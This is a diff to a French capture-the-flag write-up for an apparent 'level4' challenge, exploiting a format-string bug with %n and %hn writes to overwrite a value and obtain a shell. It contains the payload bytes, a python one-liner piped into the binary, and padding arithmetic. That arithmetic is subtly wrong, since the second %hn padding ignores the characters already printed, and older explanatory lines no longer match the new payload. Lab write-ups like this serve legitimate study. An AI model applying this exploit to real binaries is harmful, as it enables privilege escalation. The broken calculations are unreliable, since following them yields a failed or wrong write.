@@ -28,7 +28,8 @@ Il s'avère que l'adresse se situe à la 4ème position dans la stack :
 
 Shellcode finale :
 
-    \x8c\x98\x04\x08%60x%4$n
+    \x10\x98\x04\x08%60x%1$n
+    \x10\x98\x04\x08\x12\x98\x04\x08%21820x%1$hn%250x%2$hn
 
 
 - \x8c\x98\x04\x08 : 
@@ -40,9 +41,29 @@ Correspond à la valeur 64 qu'on veut écrire à l'adresse 0x804988c. On enleve 
 
 Procédure finale :
 
-    python -c 'print "\x10\x98\x04\x08%16975428x%1$n"' > /tmp/inject
+    python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08%21820x%1$hn%250x%2$hn"' > /tmp/inject
     cat /tmp/inject - | ./level4
 
 On obtient le shell avec les permissions utilisateur du fichier. On peut maintenant aller sur le profil du level4.
 
-8049810
+Adresse ou on veut ecrire : 
+- Low order : 0x08049810
+- High order : 0x08049812
+
+
+Adresse a ecrire : 0x01025544
+- Low order : 5544
+- High order : 0102
+
+Operation :
+
+5544 en hexadécimal équivaut à 21828 en décimal
+0102 en hexadécimal équivaut à 258 en décimal
+
+Ecriture :
+
+21828 - 8 = 21820
+258 - 8 = 250
+
+
+
